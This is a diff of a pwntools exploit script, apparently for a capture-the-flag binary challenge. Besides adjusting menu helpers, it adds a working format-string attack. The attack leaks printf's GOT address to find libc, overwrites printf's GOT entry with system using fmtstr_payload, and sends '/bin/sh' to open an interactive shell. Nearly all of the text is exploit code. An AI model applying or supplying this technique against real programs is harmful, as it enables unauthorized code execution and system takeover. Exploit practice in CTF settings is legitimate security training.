@@ -56,11 +56,11 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
+_add,_free,_edit,_show = 1,3,2,4,
 def add(index,content='a'*8):
 	sla(':',_add)
 	sla(':',index)
-	sa(':',content)
+	sla(':',content)
 
 def free(index):
 	sla(':',_free)
@@ -69,14 +69,27 @@ def free(index):
 def edit(index,content):
 	sla(':',_edit)
 	sla(':',index)
-	sa(':',content)
+	sla(':',content)
 
 def show(index):
 	sla(':',_show)
 	sla(':',index)
 
 # start
+ru('?\n')
+def exec_fmt(payload):
+	sl(payload)
+	info = r()
+	return info
+auto = FmtStr(exec_fmt)
 
+sl(p32(elf.got['printf']) + '%6$s')
+r(4)
+printf = u32(r(4))
+leak('printf',printf)
+base,libc,system = leak_libc('printf',printf)
+sl(fmtstr_payload(auto.offset, {elf.got['printf']:system}))
+sl('/bin/sh\x00')
 # end
 
 p.interactive()
